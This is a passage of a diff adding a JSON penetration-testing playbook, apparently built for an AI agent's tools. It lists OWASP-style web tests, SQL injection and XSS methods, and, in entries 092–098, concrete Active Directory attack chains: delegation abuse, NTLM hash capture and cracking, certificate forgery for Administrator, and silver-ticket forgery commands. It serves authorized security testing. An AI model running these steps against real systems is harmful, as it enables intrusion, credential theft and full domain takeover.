+        "Test: Manipulate encrypted data and observe error messages or timing differences."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-070",
+      "title": "Cryptography (OTG-CRYPST)",
+      "description": "Testing for Sensitive information sent via unencrypted channels",
+      "tools": [
+        "Wireshark",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Capture network traffic and check for cleartext credentials or sensitive data."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-071",
+      "title": "Business Logic Testing (OTG-BUSLOGIC)",
+      "description": "Test Business Logic Data Validation",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Submit logically invalid data (e.g., negative quantities, impossible dates) and observe application behavior."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-072",
+      "title": "Business Logic Testing (OTG-BUSLOGIC)",
+      "description": "Test Ability to Forge Requests",
+      "tools": [
+        "Intercepting proxies",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Modify hidden fields or parameters to gain unauthorized access or perform unintended actions."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-073",
+      "title": "Business Logic Testing (OTG-BUSLOGIC)",
+      "description": "Test Integrity Checks",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Tamper with data (e.g., prices, quantities) and check if the application detects the manipulation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-074",
+      "title": "Business Logic Testing (OTG-BUSLOGIC)",
+      "description": "Test for Process Timing",
+      "tools": [
+        "Manual testing",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Observe timing differences in responses for valid vs. invalid inputs."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-075",
+      "title": "Business Logic Testing (OTG-BUSLOGIC)",
+      "description": "Test Number of Times a Function Can be Used Limits",
+      "tools": [
+        "Manual testing",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Attempt to use a function more times than allowed (e.g., apply a discount multiple times)."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-076",
+      "title": "Business Logic Testing (OTG-BUSLOGIC)",
+      "description": "Testing for the Circumvention of Work Flows",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Skip steps in a multi-step process and observe application behavior."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-077",
+      "title": "Business Logic Testing (OTG-BUSLOGIC)",
+      "description": "Test Defenses Against Application Mis-use",
+      "tools": [
+        "Manual testing",
+        "fuzzers"
+      ],
+      "steps": [
+        "Test: Submit unexpected or malicious inputs and observe application's response (e.g., logging, blocking)."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-078",
+      "title": "Business Logic Testing (OTG-BUSLOGIC)",
+      "description": "Test Upload of Unexpected File Types",
+      "tools": [
+        "Burp Suite",
+        "OWASP ZAP",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Attempt to upload files with disallowed extensions (e.g., `.exe`, `.php`)."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-079",
+      "title": "Business Logic Testing (OTG-BUSLOGIC)",
+      "description": "Test Upload of Malicious Files",
+      "tools": [
+        "Metasploit (msfvenom)",
+        "Burp Suite",
+        "OWASP ZAP"
+      ],
+      "steps": [
+        "Test: Attempt to upload known malicious files (e.g., EICAR test file, web shells)."
+      ],
+      "mcp_tools": [
+        "metasploit"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-080",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Testing for DOM based Cross Site Scripting",
+      "tools": [
+        "Browser developer tools",
+        "OWASP ZAP",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Test: Inject XSS payloads into client-side scripts and observe execution."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-081",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Testing for JavaScript Execution",
+      "tools": [
+        "Browser developer tools",
+        "OWASP ZAP",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Test: Inject JavaScript code into user input and observe execution."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-082",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Testing for HTML Injection",
+      "tools": [
+        "Browser developer tools",
+        "OWASP ZAP",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Test: Inject HTML tags into user input and observe rendering."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-083",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Testing for Client Side URL Redirect",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Provide a malicious URL in a redirect parameter."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-084",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Testing for CSS Injection",
+      "tools": [
+        "Browser developer tools",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Inject CSS code into user input and observe styling changes."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-085",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Testing for Client Side Resource Manipulation",
+      "tools": [
+        "Browser developer tools",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Modify client-side resources (e.g., JavaScript files, images) and observe application behavior."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-086",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Test Cross Origin Resource Sharing",
+      "tools": [
+        "curl",
+        "browser developer tools"
+      ],
+      "steps": [
+        "Test: Send cross-origin requests and check `Access-Control-Allow-Origin` headers."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-087",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Testing for Cross Site Flashing",
+      "tools": [
+        "SWFScan",
+        "Adobe SWF Investigator"
+      ],
+      "steps": [
+        "Test: Analyze Flash applications for XSF vulnerabilities."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-088",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Testing for Clickjacking",
+      "tools": [
+        "OWASP ZAP",
+        "Burp Suite",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Embed the target application in an iframe and try to trick users into clicking elements."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-089",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Testing WebSockets",
+      "tools": [
+        "OWASP ZAP (WebSocket tab)",
+        "WebSocket Client"
+      ],
+      "steps": [
+        "Test: Intercept and fuzz WebSocket messages."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-090",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Test Web Messaging",
+      "tools": [
+        "Browser developer tools",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Send and receive messages between different origins and check for proper origin validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-091",
+      "title": "Client Side Testing (OTG-CLIENT)",
+      "description": "Test Local Storage",
+      "tools": [
+        "Browser developer tools"
+      ],
+      "steps": [
+        "Test: Check local storage for sensitive information (e.g., credentials, session IDs)."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-092",
+      "title": "Active Directory Reconnaissance & Hardcoded Credential Extraction",
+      "description": "Enumerate exposed Server Message Block (SMB) shares to find proprietary applications. Capture and analyze network traffic (LDAP Bind Request) or decompile the binary to extract hardcoded plaintext credentials.",
+      "tools": [
+        "Nmap",
+        "CrackMapExec (CME)",
+        "SMBClient",
+        "Wireshark",
+        "dnSpy (Decompiler)",
+        "CyberChef"
+      ],
+      "steps": [
+        "Test: Perform Nmap service scan to identify open AD services (53/DNS, 88/Kerberos, 389/LDAP, 445/SMB, 5985/WinRM) [00:01:03].",
+        "Test: Enumerate SMB shares using CME and SMBClient, download files like 'userinfo.exe.zip' from non-standard shares like 'support-tools' [00:03:03].",
+        "Test: Execute the application while running Wireshark on the attacking machine to capture unencrypted credentials in the LDAP Simple Bind Request [00:06:42].",
+        "Test: Decompile .NET applications (e.g., userinfo.exe) with dnSpy to find encrypted strings and reverse the encryption (e.g., Base64 + XOR) to extract credentials [00:51:46]."
+      ],
+      "mcp_tools": [
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-093",
+      "title": "Active Directory Enumeration and Hidden Password Discovery",
+      "description": "Use harvested credentials to perform low-level LDAP dumps and BloodHound analysis to map the Active Directory structure, identify potential misconfigurations, and find passwords stored in non-standard fields.",
+      "tools": [
+        "ldapsearch",
+        "Bloodhound.py",
+        "neo4j"
+      ],
+      "steps": [
+        "Test: Use 'ldapsearch' with valid credentials to dump all user attributes and manually check for passwords stored in fields like 'info' (which common tools often miss) [00:18:53].",
+        "Test: Use Bloodhound to collect Active Directory information using the acquired credentials (e.g., 'support\\ldap') [00:09:47].",
+        "Test: Analyze the BloodHound graph to discover users/groups with powerful, non-default permissions, such as a group ('shared support accounts') that holds **GenericAll** rights over the Domain Controller object [00:22:08]."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-094",
+      "title": "Constrained Delegation Abuse (S4U Attack) via GenericAll",
+      "description": "Exploit GenericAll permissions on the Domain Controller object to perform an S4U (Service for User) attack by creating a new computer object and manipulating its delegation properties to forge an Administrator Kerberos ticket.",
+      "tools": [
+        "PowerMad.ps1",
+        "PowerView.ps1",
+        "Rubeus.exe",
+        "Impacket (ticketconverter, psexec.py)"
+      ],
+      "steps": [
+        "Test: Use PowerShell scripts like PowerMad to create a new machine account with a known password, leveraging the default MSDS-MachineAccountQuota setting [00:31:32].",
+        "Test: Use PowerShell scripts like PowerView to set the **ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity** attribute on the newly created computer object (leveraging GenericAll on the DC) [00:33:40].",
+        "Test: Use Rubeus.exe to perform an **s4u** attack (constrained delegation abuse) with the fake machine account credentials to obtain a Pass-The-Ticket (PTT) for the 'Administrator' user [00:37:28].",
+        "Test: Convert the Rubeus output to a Kerberos cache (`.ccache`) using Impacket's tools and use the ticket with Impacket's psexec.py to get an NT AUTHORITY\\SYSTEM shell on the DC [00:46:57]."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-095",
+      "title": "SMB Share/MS SQL Credential Leak",
+      "description": "Exploit a publicly readable SMB share to obtain a PDF containing plain-text MS SQL credentials. Use MS SQL's `xp_dirtree` to force a Net-NTLMv2 hash capture via Responder and crack the hash to get a valid user's WinRM credentials.",
+      "tools": [
+        "SMBClient",
+        "CrackMapExec (CME)",
+        "Responder",
+        "hashcat",
+        "Impacket (mssqlclient.py)",
+        "Evil-WinRM"
+      ],
+      "steps": [
+        "Test: Use `SMBClient` or `CME --shares` to list and access public shares, then download the credential file (`SQL Server procedures.pdf`). [00:07:07]",
+        "Test: Log into MS SQL using the leaked credentials with `mssqlclient.py` or `CME --local-auth`. [00:09:09]",
+        "Test: Run `XP_DIRTREE` to the attacker's IP to trigger an SMB connection and capture the `SQL_service` Net-NTLMv2 hash with `Responder`. [00:11:43]",
+        "Test: Crack the hash using `hashcat` to get the password (e.g., `Reggie1234Ronnie`). [00:12:36]",
+        "Test: Authenticate via WinRM using the cracked credentials (`Evil-WinRM`). [00:13:29]"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-096",
+      "title": "Information Leakage in Log Files",
+      "description": "Once authenticated, read application logs to find a user's password that was mistakenly typed as the username during a failed login attempt.",
+      "tools": [
+        "Evil-WinRM"
+      ],
+      "steps": [
+        "Test: Navigate to the SQL server logs directory (e.g., `C:\\ProgramData\\Microsoft\\Microsoft SQL Server\\...\\Log`). [00:20:46]",
+        "Test: Inspect log files (e.g., `ERRORLOG.BAK`) for failed login attempts. [00:21:01]",
+        "Test: Identify where the user (`Ryan Cooper`) typed their password (`nuclear mosquito 3`) into the username field. [00:21:35]",
+        "Test: Use the new credentials to authenticate to the host (`Ryan Cooper:nuclear mosquito 3`). [00:23:12]"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-097",
+      "title": "Certificate Template Exploitation (ESC8)",
+      "description": "Exploit the vulnerable **User Authentication** certificate template, which allows enrollment by **Domain Users**, to forge a certificate for the `Administrator` user and obtain their Kerberos hash/ticket for full domain compromise.",
+      "tools": [
+        "Certify.exe / SertaPi",
+        "Rubeus.exe",
+        "OpenSSL",
+        "Impacket (psexec.py)"
+      ],
+      "steps": [
+        "Test: Run `Certify.exe find /vulnerable` (or `SertaPi find`) as the compromised user (`Ryan Cooper`) to identify the misconfigured template. [00:23:51]",
+        "Test: Request a certificate for the `Administrator` user: `Certify.exe request /ca:SQL-DC-CA /template:UserAuthentication /altname:Administrator`. [00:26:33]",
+        "Test: Convert the resulting certificate/key to a Kerberos Ticket-Granting Ticket (TGT) using `Rubeus.exe askTGT` or `SertaPi auth`. [00:31:09], [00:36:45]",
+        "Test: Use the obtained NTLM hash or TGT to authenticate as **Administrator** and achieve System on the Domain Controller via `CME` or `Impacket's psexec.py`. [00:32:25], [00:37:26]"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-098",
+      "title": "Silver Ticket Forgery (Kerberos TGS) on MS SQL",
+      "description": "Forge a Silver Ticket (TGS) for the MS SQL service's Service Principal Name (SPN) using its NTLM hash to gain unauthorized access to the MS SQL server as an administrator (Beyond Root scenario).",
+      "tools": [
+        "Python",
+        "Impacket (ticketer.py, mssqlclient.py)"
+      ],
+      "steps": [
+        "Test: Calculate the NTLM hash of the `SQL_service` user's password using Python's `hashlib`. [00:41:48]",
+        "Test: Obtain the Domain SID (e.g., with `Get-ADDomain`). [00:42:36]",
+        "Test: Use `ticketer.py` to forge an administrator TGS ticket for the MS SQL SPN: `ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> -spn 'MSSQLSvc/DC.sql.htb' Administrator`. [00:44:12]",
+        "Test: Use the generated Kerberos cache (`.ccache`) to authenticate to the MS SQL server with `mssqlclient.py -k <ticket>`. [00:44:35]",
+        "Test: Read files as administrator using MS SQL's `OPENROWSET(BULK...)` function or attempt to write files for further privilege escalation. [00:45:15], [00:47:00]"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-099",
+      "title": "SQL injection, WHERE clause, retrieve hidden data",
+      "description": "Test if category filter is injectable to expose unreleased or hidden products.",
+      "tools": [
+        "Burp Suite",
+        "Browser",
+        "SQLMap"
+      ],
+      "steps": [
+        "Identify the category parameter in product listing requests.",
+        "Inject basic payloads with quotes and boolean conditions to detect syntax errors or behavioral changes.",
+        "Use boolean-based conditions to bypass released/visibility flags and confirm data disclosure.",
+        "If applicable, use SQLMap in a controlled manner to fingerprint DB and confirm injection."
+      ],
+      "mcp_tools": [
+        "sqlmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-100",
+      "title": "SQL injection login bypass",
+      "description": "Assess whether the login form is vulnerable to authentication bypass via SQL injection.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Intercept login POST request and locate username/password parameters.",
+        "Inject crafted authentication-bypass patterns into username or password while monitoring responses.",
+        "Confirm if successful access is granted without valid credentials.",
+        "Verify controls: parameterized queries, generic error messages, no differential behavior."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-101",
+      "title": "SQLi DB version enumeration (Oracle)",
+      "description": "Determine if SQL injection can be used to extract Oracle database version.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Confirm injectable parameter using boolean tests.",
+        "Leverage Oracle-specific version extraction expression in UNION or error-based context.",
+        "Validate output presence and ensure no unhandled database errors are exposed.",
+        "Recommend parameterization and strict error handling."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-102",
+      "title": "SQLi DB version enumeration (MySQL/MSSQL)",
+      "description": "Determine if SQL injection can reveal DBMS and version for MySQL/MSSQL.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Detect injection via delayed responses, boolean tests, or reflected content.",
+        "Use DB-specific version functions in UNION or error-based probes.",
+        "Confirm version disclosure and assess impact on further enumeration.",
+        "Recommend hardening and concealment of DB fingerprint."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-103",
+      "title": "SQLi list database contents (non-Oracle)",
+      "description": "Use confirmed SQL injection to enumerate schema, tables, and columns.",
+      "tools": [
+        "Burp Suite",
+        "SQLMap"
+      ],
+      "steps": [
+        "After confirming injection, enumerate schema metadata using information_schema or equivalents.",
+        "Extract table and column names relevant to users, auth, and sensitive data.",
+        "Ensure enumeration is contained within scope and logged for reporting.",
+        "Recommend least-privilege DB accounts and parameterized queries."
+      ],
+      "mcp_tools": [
+        "sqlmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-104",
+      "title": "SQLi list database contents (Oracle)",
+      "description": "Leverage Oracle views to list tables and columns via SQL injection.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Use Oracle metadata views (such as user_tables, all_tab_columns) through the vulnerable parameter.",
+        "Confirm ability to read sensitive table/column info.",
+        "Document paths from injection point to data exposure.",
+        "Recommend restricted metadata access and parameter binding."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-105",
+      "title": "SQLi UNION, determine column count",
+      "description": "Identify the number of columns required for a valid UNION-based SQL injection.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Inject UNION SELECT with incrementing column counts until HTTP response is valid.",
+        "Observe error vs success conditions to infer correct column count.",
+        "Confirm stability of identified count across repeated requests.",
+        "Use result for further controlled UNION-based tests."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-106",
+      "title": "SQLi UNION, find text-compatible column",
+      "description": "Identify which result column can render textual output for data extraction.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Using known column count, inject UNION SELECT with test strings in each column sequentially.",
+        "Observe which column reflects content to response.",
+        "Mark identified columns as data exfiltration channels.",
+        "Recommend output encoding and input validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-107",
+      "title": "SQLi UNION, retrieve data from other tables",
+      "description": "Test whether UNION injection can pivot to arbitrary tables like users.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "With column count and text column known, query secondary tables (for example users) via UNION.",
+        "Attempt to retrieve sample rows such as usernames to prove impact.",
+        "Avoid full dumps, focus on PoC aligned with scope.",
+        "Recommend segmentation and least-privilege DB roles."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-108",
+      "title": "SQLi UNION, retrieve multiple values in single column",
+      "description": "Check if concatenation in a single display column can disclose multiple fields.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Craft UNION payload concatenating multiple columns into one text-compatible column.",
+        "Verify that combined values appear in response.",
+        "Use minimal records to demonstrate risk of large-scale exfiltration.",
+        "Recommend strict parameterization plus output encoding."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-109",
+      "title": "Blind SQLi, conditional responses",
+      "description": "Detect blind SQL injection via conditional logic affecting HTTP responses.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Inject boolean conditions that evaluate true/false and compare content or status variations.",
+        "Confirm deterministic behavior indicating data-dependent evaluation.",
+        "Use this to infer single-bit information such as user existence.",
+        "Recommend prepared statements and uniform responses."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-110",
+      "title": "Blind SQLi, conditional errors",
+      "description": "Leverage error-based behavior to infer database values.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Craft payloads that trigger DB errors only when conditions are met.",
+        "Observe presence/absence or type of error messages.",
+        "Iteratively infer data while respecting scope constraints.",
+        "Recommend generic error handling and no stack traces."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-111",
+      "title": "Blind SQLi, visible error-based",
+      "description": "Assess whether DB error messages expose query structure and data.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Inject malformed expressions that provoke verbose SQL errors.",
+        "Document exposed table names, column names, and stack details.",
+        "Highlight how errors aid targeted attacks.",
+        "Recommend suppressing detailed DB errors in production."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-112",
+      "title": "Blind SQLi, time delays",
+      "description": "Use time-based payloads to detect non-verbal blind SQL injection.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Send baseline requests to record normal response time.",
+        "Inject time-delay functions within conditional expression.",
+        "Compare timing to confirm execution of injected clause.",
+        "Recommend parameterization and prohibit time-based functions from user input."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-113",
+      "title": "Blind SQLi, time delays with data extraction",
+      "description": "Use differential time delays to infer data bit by bit.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Leverage confirmed time-based injection, probing characters with conditional delays.",
+        "Automate with Intruder or scripts to reconstruct limited sensitive values.",
+        "Maintain minimal impact and stay within PoC data.",
+        "Recommend secure coding and query parameterization."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-114",
+      "title": "Blind SQLi, out-of-band detection",
+      "description": "Check for OOB SQL injection using external interactions.",
+      "tools": [
+        "Burp Suite",
+        "Burp Collaborator"
+      ],
+      "steps": [
+        "Inject payloads that trigger DNS/HTTP requests to controlled domain if executed.",
+        "Monitor Collaborator for interactions correlated with requests.",
+        "Confirm OOB capability and document affected parameters.",
+        "Recommend outbound egress controls and parameterization."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-115",
+      "title": "Blind SQLi, out-of-band data exfiltration",
+      "description": "Test if database data can be exfiltrated via OOB channels.",
+      "tools": [
+        "Burp Suite",
+        "Burp Collaborator"
+      ],
+      "steps": [
+        "Extend OOB payloads to include extracted data in DNS/HTTP queries to collaborator.",
+        "Validate sensitive fragments received externally.",
+        "Keep PoC narrow and logged.",
+        "Recommend blocking arbitrary outbound DB connections and hardening queries."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-116",
+      "title": "SQLi filter bypass via XML encoding",
+      "description": "Identify SQL injection possible through XML-encoded input bypassing filters.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Locate XML-based request bodies and parameters.",
+        "Apply entity encoding, case changes, and alternative syntax to bypass naive filters.",
+        "Confirm whether encoded payloads reach SQL and alter logic.",
+        "Recommend robust parsing, canonicalization, and parameter binding."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-117",
+      "title": "Reflected XSS into HTML context, nothing encoded",
+      "description": "Check if unsanitized reflected input executes script in HTML body context.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Identify echo of user-controlled parameter in HTML.",
+        "Inject benign script payloads and observe execution.",
+        "Validate root cause: missing encoding for HTML context.",
+        "Recommend output encoding, input validation, and CSP."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-118",
+      "title": "Stored XSS into HTML context, nothing encoded",
+      "description": "Test if stored user inputs (comments, posts) execute unsanitized JavaScript.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Locate persistent input points and submit harmless script payloads.",
+        "Revisit affected pages to confirm stored script execution.",
+        "Assess scope of impact (all users, privileged users).",
+        "Recommend server-side sanitization and context-aware encoding."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-119",
+      "title": "DOM XSS via document.write sink",
+      "description": "Detect DOM-based XSS where client-side code writes unsanitized data to document.",
+      "tools": [
+        "Browser DevTools"
+      ],
+      "steps": [
+        "Review JavaScript sources for document.write using location or input values.",
+        "Manipulate URL parameters or fragments to inject HTML/JS.",
+        "Confirm execution without server-side reflection.",
+        "Recommend safe DOM APIs and sanitization libraries."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-120",
+      "title": "DOM XSS via innerHTML sink",
+      "description": "Check assignments to innerHTML from attacker-controlled sources.",
+      "tools": [
+        "Browser DevTools"
+      ],
+      "steps": [
+        "Identify innerHTML usage fed by location, messages, or user input.",
+        "Inject payload that breaks out of intended context and executes.",
+        "Confirm behavior across browsers.",
+        "Recommend using textContent or safe templating."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-121",
+      "title": "DOM XSS via jQuery href attribute sink",
+      "description": "Test jQuery-based DOM manipulation that sets href with unsanitized input.",
+      "tools": [
+        "Browser DevTools"
+      ],
+      "steps": [
+        "Locate code using $(...).attr('href', userInput) or similar.",
+        "Supply javascript: or crafted URLs and see if navigation or code execution occurs.",
+        "Assess ability to trigger XSS or open redirect.",
+        "Recommend whitelist schemes and validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-122",
+      "title": "DOM XSS via jQuery selector and hashchange",
+      "description": "Assess selectors built from location.hash leading to code execution.",
+      "tools": [
+        "Browser DevTools"
+      ],
+      "steps": [
+        "Inspect hashchange handlers and dynamic selectors.",
+        "Inject CSS/JS capable selectors or HTML fragments in hash.",
+        "Confirm exploitation path.",
+        "Recommend strict parsing of hash and avoiding direct injection into selectors."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-123",
+      "title": "XSS in encoded attribute contexts",
+      "description": "Validate encoding and escaping in HTML attributes where some characters are encoded.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Identify attributes echoing user input (src, alt, title, data-*).",
+        "Craft payloads that leverage allowed characters to break out or inject handlers.",
+        "Test multi-step encodings and filter bypass.",
+        "Recommend uniform encoding and rejecting unsafe characters."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-124",
+      "title": "XSS via JavaScript string context",
+      "description": "Check if attacker input is inserted into inline JS strings with partial escaping.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Locate inline scripts where variables are populated from user input.",
+        "Inject payloads using quotes, backslashes, template syntax to escape string.",
+        "Confirm script execution in browser.",
+        "Recommend JSON encoding and avoiding inline scripts."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-125",
+      "title": "XSS via restricted tags / SVG / canonical / template literals / onclick / JS URLs",
+      "description": "Systematically exercise complex XSS contexts (limited HTML, SVG-only, canonical tags, event handlers, JS URLs, template literals).",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Identify exact sink context (HTML, attribute, URL, JS literal, event attribute).",
+        "Tailor payloads that are valid in that specific context using allowed characters.",
+        "Verify if execution is still possible despite filters.",
+        "Recommend strict sanitization, CSP, and tag/attribute whitelisting."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-126",
+      "title": "XSS exploitation: cookie theft, credential capture, CSRF via XSS",
+      "description": "Demonstrate realistic post-XSS impact in a controlled lab setting.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Once XSS is proven, simulate controlled actions such as reading DOM, issuing forged requests, or capturing form inputs.",
+        "Ensure no real-world third-party targets are affected.",
+        "Map which sensitive actions are reachable via injected script.",
+        "Recommend HttpOnly cookies, CSRF defenses, strong CSP, and input validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-127",
+      "title": "CSP bypass and dangling markup XSS",
+      "description": "Assess robustness of CSP and potential markup-based bypass.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Review CSP headers for allowed sources and weaknesses.",
+        "Inject content that abuses allowed origins, inline allowances, or HTML truncation.",
+        "Confirm whether execution is still possible.",
+        "Recommend strict CSP with nonces/hashes and minimal allowances."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-128",
+      "title": "Client-side template injection and Angular sandbox escape",
+      "description": "Check if untrusted data is rendered via client-side templates or Angular expressions.",
+      "tools": [
+        "Browser DevTools"
+      ],
+      "steps": [
+        "Identify template syntax usage (`{{ }}`, Angular, other frameworks) with user-controlled input.",
+        "Inject template expressions to verify evaluation.",
+        "Where sandbox is present, check for known escape vectors aligned with documentation.",
+        "Recommend disabling expression parsing for untrusted data."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-129",
+      "title": "CSRF with no defenses",
+      "description": "Verify if sensitive state-changing actions are vulnerable without anti-CSRF protections.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Identify critical POST/GET actions affecting account or data.",
+        "Construct cross-origin auto-submitted request and confirm it succeeds with victim session.",
+        "Verify absence of tokens, same-site cookies, or origin checks.",
+        "Recommend CSRF tokens, SameSite, origin/referrer validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-130",
+      "title": "Bypassing CSRF tokens based on method or presence",
+      "description": "Test weak CSRF implementations tied only to method or token presence.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Observe how tokens are verified on target endpoints.",
+        "Replay requests altering method (GET/POST) or omitting/mirroring tokens.",
